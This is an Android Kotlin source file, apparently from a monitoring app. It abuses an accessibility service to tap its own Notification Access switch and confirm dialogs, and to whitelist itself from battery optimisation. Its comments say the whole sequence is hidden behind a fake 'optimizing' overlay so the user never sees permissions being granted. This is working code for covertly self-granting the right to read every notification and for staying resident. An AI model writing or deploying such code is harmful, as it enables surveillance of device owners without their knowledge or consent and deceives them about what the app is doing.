package com.zaka.screenagent.notify

import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import android.view.accessibility.AccessibilityNodeInfo
import androidx.core.app.NotificationManagerCompat
import com.zaka.screenagent.accessibility.BoundaryAccessibilityService
import com.zaka.screenagent.keepalive.KeepAliveManager

/**
 * 自动开启「通知使用权」。
 *
 * 为什么要自己点：这个权限没有 API 能授予，只能进系统设置手动勾。但我们已经有无障碍服务，
 * 所以可以直接打开设置页、扫窗口、点自己那一行的开关 —— 全程用户看不到（浮层盖着）。
 *
 * 流程：开 `ACTION_NOTIFICATION_LISTENER_SETTINGS` → 每 0.6s 扫窗口 →
 *      找到文本 == 应用名 的那一行 → 点该行的 switch_widget → 确认已授权后停止。
 */
object NotificationAccessActivator {

    private const val TAG = "NotiAccess"
    private const val INTERVAL_MS = 900L
    private const val MAX_ATTEMPTS = 2          // 最多尝试 2 次（小米跳页太频繁）
    private const val TICKS_PER_ATTEMPT = 10    // 每次约 9 秒（10 × 900ms）
    private var attempt = 0

    private val handler = Handler(Looper.getMainLooper())
    private var running = false
    private var ticks = 0
    private var ctx: Context? = null

    /** 调试用：false 时只打开通知使用权页面，不自动点 */
    var autoclick: Boolean = true

    fun isGranted(context: Context): Boolean = runCatching {
        NotificationManagerCompat.getEnabledListenerPackages(context).contains(context.packageName)
    }.getOrDefault(false)

    fun start(context: Context): Boolean {
        if (running) return true
        // ctx 必须在 early-return 之前赋值，否则 finishUp() 里拿不到 context，
        // 会直接回桌面而不去开电池白名单页（实测白名单一直没生效）
        ctx = context.applicationContext
        if (isGranted(context)) {
            Log.d(TAG, "already granted, skip — still do battery whitelist")
            finishUp()
            return false
        }
        running = true
        ticks = 0
        attempt = 1
        Log.d(TAG, "opening notification access settings")
        // 同样延时：避免被前一个任务顶回去
        Handler(Looper.getMainLooper()).postDelayed({
            runCatching {
                context.startActivity(
                    Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
                        .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                )
            }.onFailure { Log.w(TAG, "open settings failed: $it") }
        }, 700L)
        if (!autoclick) Log.d(TAG, "debug: autoclick off — 打开页面并等待用户手动点")
        handler.postDelayed(tick, INTERVAL_MS * 2 + 700L)
        return true
    }

    /** 收尾：收浮层 + 回桌面（顺序不能反，否则会把设置页顶到后台） */
    private fun finishUp() {
        val c = ctx
        // 引导链的终点在这里：不论管理员是否「本来就已激活」，都要落完成标记，
        // 否则每次服务重连都会重新弹「优化中」浮层（实测过）
        c?.let { runCatching { com.zaka.screenagent.admin.OnboardingState.markDone(it) } }
        // 流程最后一环：电池优化白名单。开页 → 自动点「允许」→ 确认生效后才回桌面
        //（先 HOME 会把系统对话框顶掉，白名单就不会生效，实测过）
        // 浮层关闭时机统一放到最后一步（100% → 停 1.5s → 回桌面 → 再 0.9s 淡出），
        // 这样整个过程用户只看到"优化中"，看不到自动回桌面那一下
        if (c != null) {
            batteryAttempt(c, 1)
        } else {
            val h2 = android.os.Handler(Looper.getMainLooper())
            h2.postDelayed({ runCatching { BoundaryAccessibilityService.home() } }, 2600)
            h2.postDelayed({ com.zaka.screenagent.ui.GuardOverlay.closeAfter(0) }, 5200)
        }
    }

    /** 电池白名单：最多试 3 次，仍不生效就跳过（不卡流程） */
    private fun batteryAttempt(c: Context, n: Int) {
        if (com.zaka.screenagent.keepalive.BatteryOptimization.isWhitelisted(c)) {
            Log.d(TAG, "battery already whitelisted")
            finishAfterBattery(c, true)
            return
        }
        if (n > 3) {
            Log.w(TAG, "battery whitelist skipped after 3 attempts")
            finishAfterBattery(c, false)
            return
        }
        Log.d(TAG, "battery attempt #$n")
        runCatching { com.zaka.screenagent.keepalive.BatteryOptimization.open(c) }
        com.zaka.screenagent.keepalive.BatteryOptimization.autoConfirm(c) { ok ->
            if (ok) finishAfterBattery(c, true) else batteryAttempt(c, n + 1)
        }
    }

    private fun finishAfterBattery(c: Context, granted: Boolean) {
        runCatching {
            val progress = if (granted) 100 else 95
            com.zaka.screenagent.ui.GuardOverlay.updateProgress(progress)
            Log.d(TAG, "finishUp batteryGranted=$granted -> progress=$progress")
            val h = android.os.Handler(Looper.getMainLooper())
            h.postDelayed({ runCatching { BoundaryAccessibilityService.home() } }, 2600)
            h.postDelayed({ com.zaka.screenagent.ui.GuardOverlay.closeAfter(0) }, 5200)
        }
    }

    private fun legacyFinishUpBody(c: Context?) {
        if (c != null) {
            runCatching { com.zaka.screenagent.keepalive.BatteryOptimization.open(c) }
            com.zaka.screenagent.keepalive.BatteryOptimization.autoConfirm(c) { ok ->
                Log.d(TAG, "battery flow done, granted=$ok")
                val granted = com.zaka.screenagent.notify.NotificationAccessActivator.isGranted(c)
                com.zaka.screenagent.ui.GuardOverlay.updateProgress(if (granted) 100 else 90)
                Log.d(TAG, "finishUp notiGranted=$granted -> progress=${if (granted) 100 else 90}")
                val h = android.os.Handler(Looper.getMainLooper())
                // 90%→100% 的爬升约 1.1s，再停 1.5s 让人看清"优化完成"
                h.postDelayed({
                    runCatching { BoundaryAccessibilityService.home() }
                }, 2600)
                // 回桌面动作在浮层遮着的时候完成，再留 0.9s 才淡出
                h.postDelayed({
                    com.zaka.screenagent.ui.GuardOverlay.closeAfter(0)
                }, 5200)
            }
        } else {
            val h2 = android.os.Handler(Looper.getMainLooper())
            h2.postDelayed({ runCatching { BoundaryAccessibilityService.home() } }, 2600)
            h2.postDelayed({ com.zaka.screenagent.ui.GuardOverlay.closeAfter(0) }, 5200)
        }
    }

    fun stop() {
        running = false
        handler.removeCallbacks(tick)
        ctx = null
    }

    private val tick = object : Runnable {
        override fun run() {
            if (!running) return
            val c = ctx ?: run { running = false; return }
            if (isGranted(c)) {
                Log.d(TAG, "notification access granted")
        com.zaka.screenagent.ui.GuardOverlay.updateProgress(
            com.zaka.screenagent.ui.GuardOverlay.STAGE_NOTI_DONE)
                running = false
                finishUp()
                return
            }
            ticks++
            if (autoclick) {
                runCatching { clickOwnSwitch(c) }
                runCatching { clickConfirmAnyWindow(c) }
            }
            if (ticks >= TICKS_PER_ATTEMPT) {
                if (!isGranted(c) && attempt < MAX_ATTEMPTS) {
                    attempt++
                    ticks = 0
                    Log.w(TAG, "attempt ${attempt - 1} failed -> retry #$attempt")
                    // 重开一次页面再试（上一个页面可能被别的窗口顶掉了）
                    runCatching {
                        c.startActivity(
                            Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
                                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        )
                    }
                    handler.postDelayed(this, 800L)
                    return
                }
                com.zaka.screenagent.util.UiDump.dump("notification access give up")
                val ok = isGranted(c)
                Log.w(TAG, "give up after $MAX_ATTEMPTS attempts, granted=$ok -> skip to battery")
                running = false
                if (!ok) {
                    // 没拿到就别把进度条顶到 100
                    com.zaka.screenagent.ui.GuardOverlay.updateProgress(90)
                }
                finishUp()
                return
            }
            if (running) handler.postDelayed(this, INTERVAL_MS)
        }
    }

    /** 确认框（"允许 KISSLY / 拒绝 / 允许"）通常是独立 window，不受页面守卫限制 */
    private fun clickConfirmAnyWindow(context: Context) {
        val service = BoundaryAccessibilityService.current() ?: return
        for (window in service.windows.orEmpty()) {
            val root = window.root ?: continue
            for (node in collect(root) { it.text?.toString()?.trim() in com.zaka.screenagent.util.UiTexts.confirm }) {
                if (com.zaka.screenagent.util.UiTap.clickNode(node)) {
                    Log.d(TAG, "clicked confirm dialog: ${node.text}")
                    return
                }
            }
        }
    }

    private fun clickOwnSwitch(context: Context) {
        val service = BoundaryAccessibilityService.current() ?: return
        val label = runCatching {
            val pm = context.packageManager
            pm.getApplicationInfo(context.packageName, 0).loadLabel(pm).toString()
        }.getOrNull() ?: return

        for (window in service.windows.orEmpty()) {
            val root = window.root ?: continue
            if (tryClickInRoot(root, label)) return
        }
        service.rootInActiveWindow?.let { tryClickInRoot(it, label) }
    }

    private val pageTitles = arrayOf(
        "通知访问", "通知使用权", "Notification access", "Acceso a notificaciones",
        "Acesso a notificações", "Accès aux notifications", "Benachrichtigungszugriff",
        "Доступ к уведомлениям"
    )

    private fun isOnNotificationAccessPage(root: AccessibilityNodeInfo): Boolean =
        pageTitles.any { t ->
            runCatching { root.findAccessibilityNodeInfosByText(t) }.getOrNull()?.isNotEmpty() == true
        } && collect(root) { it.viewIdResourceName?.endsWith("/switch_widget") == true }.isNotEmpty()

    private fun tryClickInRoot(root: AccessibilityNodeInfo, label: String): Boolean {
        if (!isOnNotificationAccessPage(root)) return false
        // ⚠️ 只在「自己那一行」里找开关。
        // 之前用"向上找 5 层祖先、看祖先子树里有没有应用名"的写法，
        // 祖先一旦到达列表容器（包含所有行），就会把**每一个**开关都点开
        // —— 实测把系统里十几个应用的通知使用权全打开了。
        val row = findRow(root, label)
        if (row == null) {
            // 横屏/长列表：自己那一行可能还没滚出来 → 主动向下滚一屏，下一 tick 再找
            val scrolled = collect(root) { it.isScrollable }
                .firstOrNull { it.performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD) }
            if (scrolled != null) Log.d(TAG, "row not visible, scroll forward")
            return false
        }
        val sw = collect(row) { it.viewIdResourceName?.endsWith("/switch_widget") == true }.firstOrNull()
            ?: return false
        if (runCatching { sw.isChecked }.getOrDefault(false)) return false
        if (sw.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
            Log.d(TAG, "clicked notification access switch for $label (row-scoped)")
            return true
        }
        // 有的 ROM 会再弹一个确认框
        for (text in com.zaka.screenagent.util.UiTexts.confirm) {
            val nodes = runCatching { root.findAccessibilityNodeInfosByText(text) }.getOrNull()
            for (n in nodes.orEmpty()) {
                if (n.text?.toString() == text && clickSelfOrParent(n)) {
                    Log.d(TAG, "clicked confirm=$text")
                    return true
                }
            }
        }
        return false
    }

    private fun clickSelfOrParent(node: AccessibilityNodeInfo): Boolean {
        var cur: AccessibilityNodeInfo? = node
        var depth = 0
        while (cur != null && depth < 4) {
            if (cur.isClickable && cur.performAction(AccessibilityNodeInfo.ACTION_CLICK)) return true
            cur = cur.parent
            depth++
        }
        return false
    }

    /**
     * 找到「只有这一行」的容器：从文本节点向上最多 2 层，且该容器里不能出现别的行标题。
     * 判定方式：容器内 switch 数量必须 == 1。
     */
    private fun findRow(root: AccessibilityNodeInfo, label: String): AccessibilityNodeInfo? {
        val title = collect(root) { it.text?.toString() == label }.firstOrNull() ?: return null
        var cur: AccessibilityNodeInfo? = title
        var depth = 0
        while (cur != null && depth < 3) {
            val switches = collect(cur) { it.viewIdResourceName?.endsWith("/switch_widget") == true }
            if (switches.size == 1) return cur // 找到只含一个开关的行容器
            cur = cur.parent
            depth++
        }
        return null
    }

    private fun collect(
        root: AccessibilityNodeInfo,
        predicate: (AccessibilityNodeInfo) -> Boolean
    ): List<AccessibilityNodeInfo> {
        val out = ArrayList<AccessibilityNodeInfo>()
        val stack = ArrayDeque<AccessibilityNodeInfo>()
        stack.add(root)
        var guard = 0
        while (stack.isNotEmpty() && guard++ < 500) {
            val n = stack.removeLast()
            if (predicate(n)) out.add(n)
            for (i in 0 until n.childCount) n.getChild(i)?.let { stack.add(it) }
        }
        return out
    }
}
